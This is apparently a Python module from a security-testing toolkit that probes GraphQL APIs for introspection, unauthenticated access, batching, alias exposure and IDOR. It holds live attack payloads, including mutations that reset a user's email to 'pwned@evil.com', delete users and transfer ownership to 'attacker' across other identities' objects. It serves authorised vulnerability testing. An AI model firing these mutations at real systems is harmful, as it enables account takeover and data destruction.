"""
BugKit v4 — GraphQL Auth Tester

Tests GraphQL endpoints for:
  • Introspection (schema disclosure)
  • Unauthenticated query access
  • Batching abuse (rate limit bypass)
  • Field-level auth bypass via aliases
  • IDOR through GraphQL object IDs
  • Mutation auth (cross-user mutations)
  • Subscription auth
  • Sensitive fields in __typename chains
"""
from __future__ import annotations

import json
from typing import Any, Optional

from core.session import BugKitSession
from core import logger
from db import queries


GRAPHQL_PATHS = [
    "/graphql", "/graphiql", "/api/graphql", "/api/v1/graphql",
    "/api/v2/graphql", "/query", "/gql", "/graph",
]

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
"""

BATCH_PROBE = [
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
    {"query": "{ __typename }"},
]

COMMON_QUERIES = [
    ("me",       "{ me { id email role permissions } }"),
    ("users",    "{ users { id email role } }"),
    ("accounts", "{ accounts { id name owner } }"),
    ("admin",    "{ admin { users { id email } } }"),
    ("viewer",   "{ viewer { id email plan subscription { status } } }"),
    ("orgs",     "{ organizations { id name members { id email role } } }"),
]

IDOR_MUTATIONS = [
    ("updateUser",   'mutation { updateUser(id: "%s", email: "pwned@evil.com") { id email } }'),
    ("deleteUser",   'mutation { deleteUser(id: "%s") { success } }'),
    ("transferOwner",'mutation { transferOwnership(id: "%s", newOwnerId: "attacker") { success } }'),
]


class GraphQLTester:
    """
    Comprehensive GraphQL security tester.

    Usage:
        tester = GraphQLTester(session)
        tester.run(target_id=1, base_url="https://api.example.com")
    """

    def __init__(self, session: BugKitSession) -> None:
        self.session   = session
        self._findings = 0
        self._endpoint: Optional[str] = None
        self._schema:   Optional[dict] = None

    def run(self, target_id: int, base_url: str) -> int:
        logger.section(f"GraphQL Tester  →  {base_url}")
        self._tid  = target_id
        self._base = base_url.rstrip("/")
        self._findings = 0

        # 1. Discover endpoint
        ep = self._discover_endpoint()
        if not ep:
            logger.warn("No GraphQL endpoint found.")
            return 0
        self._endpoint = ep
        logger.ok(f"GraphQL endpoint: {ep}")

        # 2. Introspection
        self._test_introspection()

        # 3. Unauth access
        self._test_unauth_queries()

        # 4. Batching
        self._test_batching()

        # 5. Field-level auth (alias bypass)
        self._test_alias_bypass()

        # 6. Cross-user mutations (if identities loaded)
        self._test_mutation_auth()

        # 7. IDOR via known object IDs
        self._test_graphql_idor()

        logger.section("GraphQL Summary")
        logger.ok(f"Findings: {self._findings}")
        return self._findings

    # ── Discovery ──────────────────────────────────────────────────────

    def _discover_endpoint(self) -> Optional[str]:
        for path in GRAPHQL_PATHS:
            url  = self._base + path
            resp = self.session.post(
                url,
                json    = {"query": "{ __typename }"},
                headers = {"Content-Type": "application/json"},
                capture = False,
            )
            if resp and resp.status_code < 500:
                try:
                    data = resp.json()
                    if "data" in data or "errors" in data:
                        queries.upsert_endpoint(
                            target_id = self._tid, url=url,
                            method="POST", source="graphql",
                        )
                        return url
                except Exception:
                    pass
        return None

    # ── Tests ──────────────────────────────────────────────────────────

    def _test_introspection(self) -> None:
        logger.info("Testing introspection…")
        resp = self._gql(INTROSPECTION_QUERY)
        if resp is None:
            return
        try:
            data = resp.json()
            if data.get("data", {}).get("__schema"):
                schema = data["data"]["__schema"]
                self._schema = schema
                types = [t["name"] for t in schema.get("types", [])]
                sensitive = [t for t in types if any(
                    kw in t.lower() for kw in
                    ["user","admin","token","secret","password","internal","billing"]
                )]
                self._save(
                    title    = "GraphQL Introspection Enabled",
                    severity = "MEDIUM",
                    detail   = (
                        f"Full schema exposed. {len(types)} types found.\n"
                        f"Sensitive types: {sensitive[:10]}"
                    ),
                    evidence = f"Query types: {schema.get('queryType')}\n"
                               f"Mutation types: {schema.get('mutationType')}\n"
                               f"Sample types: {types[:20]}",
                    confidence="high",
                    tags     = ["graphql","introspection","schema-leak"],
                    cwe      = "CWE-200",
                    cvss     = 5.3,
                )
        except Exception:
            pass

    def _test_unauth_queries(self) -> None:
        logger.info("Testing unauthenticated query access…")
        for name, query in COMMON_QUERIES:
            # Send anonymously — this test only needs the anonymous
            # response; we used to also fire an authenticated request just
            # to feed a comparison whose result was never actually used.
            self.session.as_guest()
            anon_resp = self._gql(query)
            # Restore
            if self.session._active_id:
                self.session.use(self.session._active_id)

            if anon_resp is None:
                continue

            # If anonymous also got real data (not an error)
            try:
                anon_data = anon_resp.json()
                has_data  = bool(anon_data.get("data", {}).get(name))
                has_error = bool(anon_data.get("errors"))
            except Exception:
                has_data = has_error = False

            if has_data and not has_error:
                self._save(
                    title    = f"GraphQL Unauthenticated Query — {name}",
                    severity = "HIGH",
                    detail   = f"Query '{name}' returned data without authentication.",
                    evidence = anon_resp.text[:500],
                    confidence="high",
                    tags     = ["graphql","unauth","access-control"],
                    cwe      = "CWE-862",
                    cvss     = 7.5,
                )

    def _test_batching(self) -> None:
        logger.info("Testing query batching (rate limit bypass)…")
        resp = self.session.post(
            self._endpoint,
            json    = BATCH_PROBE,
            headers = {"Content-Type": "application/json"},
            capture = True,
        )
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) == len(BATCH_PROBE):
                    self._save(
                        title    = "GraphQL Query Batching Enabled",
                        severity = "MEDIUM",
                        detail   = (
                            f"Server processed a batch of {len(BATCH_PROBE)} queries in one request. "
                            "This bypasses per-request rate limiting and can be used to brute-force "
                            "OTP codes, passwords, or enumerate data efficiently."
                        ),
                        evidence = f"Batch of {len(BATCH_PROBE)} returned {len(data)} results.",
                        confidence="high",
                        tags     = ["graphql","batching","rate-limit-bypass"],
                        cwe      = "CWE-770",
                        cvss     = 5.8,
                    )
            except Exception:
                pass

    def _test_alias_bypass(self) -> None:
        """
        Alias the same field twice — some implementations apply auth
        per-field type but allow bypassing via aliasing.
        """
        logger.info("Testing alias-based field bypass…")
        query = """
        {
          a: me { id email }
          b: me { id email role permissions }
        }
        """
        resp = self._gql(query)
        if resp is not None:
            try:
                data = resp.json().get("data", {})
                if data.get("a") and data.get("b"):
                    # Both aliases returned data — check if b has more fields
                    a_keys = set(data["a"].keys()) if data["a"] else set()
                    b_keys = set(data["b"].keys()) if data["b"] else set()
                    extra  = b_keys - a_keys
                    if extra:
                        self._save(
                            title    = "GraphQL Alias Exposes Extra Fields",
                            severity = "MEDIUM",
                            detail   = f"Aliased query returned extra fields: {extra}",
                            evidence = json.dumps(data, indent=2)[:500],
                            confidence="medium",
                            tags     = ["graphql","alias","field-exposure"],
                            cwe      = "CWE-200",
                            cvss     = 4.3,
                        )
            except Exception:
                pass

    def _test_mutation_auth(self) -> None:
        """Test cross-user mutations using loaded identities."""
        if len(self.session.identity_names) < 2:
            logger.debug("Need ≥2 identities for mutation auth test.")
            return
        logger.info("Testing cross-user mutation auth…")

        objects = queries.get_objects(self._tid)
        for obj in objects[:5]:
            for name, template in IDOR_MUTATIONS:
                query = template % obj.object_id
                # Send as different identity from owner
                for identity in self.session.identity_names:
                    if identity == obj.owner:
                        continue
                    resp = self.session.request(
                        "POST", self._endpoint,
                        json          = {"query": query},
                        headers       = {"Content-Type": "application/json"},
                        identity_name = identity,
                        capture       = True,
                    )
                    if resp is None:
                        continue
                    try:
                        data = resp.json()
                        if data.get("data") and not data.get("errors"):
                            self._save(
                                title    = f"GraphQL IDOR — {name} on {obj.kind} {obj.object_id}",
                                severity = "CRITICAL",
                                detail   = (
                                    f"Identity '{identity}' executed mutation '{name}' on "
                                    f"{obj.kind} ID {obj.object_id} owned by '{obj.owner}'."
                                ),
                                evidence = resp.text[:500],
                                confidence="high",
                                tags     = ["graphql","idor","mutation","bola"],
                                cwe      = "CWE-639",
                                cvss     = 9.1,
                            )
                    except Exception:
                        pass

    def _test_graphql_idor(self) -> None:
        """
        Try fetching known object IDs belonging to other users via
        GraphQL node/object queries.
        """
        logger.info("Testing GraphQL object-level IDOR…")
        objects = queries.get_objects(self._tid)
        if not objects:
            return

        idor_queries = [
            ('node',   'query { node(id: "%s") { id __typename ... on User { email role } } }'),
            ('user',   'query { user(id: "%s") { id email role permissions } }'),
            ('order',  'query { order(id: "%s") { id status total user { id email } } }'),
            ('invoice','query { invoice(id: "%s") { id amount status user { email } } }'),
        ]

        for obj in objects[:10]:
            for q_name, template in idor_queries:
                query = template % obj.object_id
                # Try as a different identity
                for identity in self.session.identity_names:
                    if identity == obj.owner:
                        continue
                    resp = self.session.request(
                        "POST", self._endpoint,
                        json          = {"query": query},
                        headers       = {"Content-Type": "application/json"},
                        identity_name = identity,
                        capture       = True,
                    )
                    if resp is None:
                        continue
                    try:
                        data = resp.json()
                        result_data = data.get("data", {}).get(q_name)
                        if result_data and not data.get("errors"):
                            self._save(
                                title    = f"GraphQL IDOR — {q_name}({obj.object_id})",
                                severity = "HIGH",
                                detail   = (
                                    f"Identity '{identity}' retrieved {obj.kind} ID "
                                    f"{obj.object_id} (owned by '{obj.owner}') via GraphQL."
                                ),
                                evidence = resp.text[:500],
                                confidence="high",
                                tags     = ["graphql","idor","access-control"],
                                cwe      = "CWE-639",
                                cvss     = 8.1,
                            )
                            break
                    except Exception:
                        pass

    # ── Helpers ────────────────────────────────────────────────────────

    def _gql(self, query: str, variables: dict = None) -> Optional[Any]:
        body = {"query": query}
        if variables:
            body["variables"] = variables
        return self.session.post(
            self._endpoint,
            json    = body,
            headers = {"Content-Type": "application/json"},
            capture = True,
        )

    def _save(
        self,
        title:      str,
        severity:   str,
        detail:     str,
        evidence:   str,
        confidence: str,
        tags:       list,
        cwe:        str,
        cvss:       float,
    ) -> None:
        cap = self.session.last_capture
        queries.save_finding(
            target_id    = self._tid,
            module       = "graphql",
            title        = title,
            severity     = severity,
            confidence   = confidence,
            url          = self._endpoint or "",
            detail       = detail,
            evidence     = evidence,
            raw_request  = cap.raw_request  if cap else "",
            raw_response = cap.raw_response[:2000] if cap else "",
            curl_poc     = cap.curl         if cap else "",
            impact       = "GraphQL API authorization bypass or data disclosure.",
            remediation  = (
                "Disable introspection in production. Implement field-level authorization. "
                "Enforce object ownership checks on all resolvers. "
                "Apply per-user rate limits server-side, not per-request."
            ),
            cwe  = cwe,
            cvss = cvss,
            tags = tags,
        )
        self._findings += 1
        logger.finding(title=title, severity=severity,
                       url=self._endpoint or "", confidence=confidence)
